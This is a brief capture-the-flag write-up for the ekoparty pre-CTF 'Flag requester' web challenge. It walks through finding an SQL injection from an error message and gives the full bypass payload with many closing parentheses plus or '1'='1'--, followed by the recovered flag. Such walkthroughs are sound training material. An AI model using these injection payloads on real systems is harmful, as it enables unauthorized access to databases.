## ekoparty_pre-ctf: web25

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| ekoparty_pre-ctf | Flag requester | Web |    25 |

>*Description:*
>Go and get your flag!
> http://challs.ctf.site:10000/flagrequest/

----------
## Write-up

Requesting a flag like 1' gives the following error:

>```
>ERROR: unrecognized token: "'1''))))))))))))))))))))"
>```

So there is SQL injection possible, after a *couple* of tries with the SQL-injection at the wrong place:

>```
>1' or '1'='1'))))))))))))))))))))--:
>```

We try something else:

>```
>1')))))))))))))))))))) or '1'='1'--
>```
 
which gives the flag:
 
 >```
 >EKO{sqli_with_a_lot_of_)}
 >```
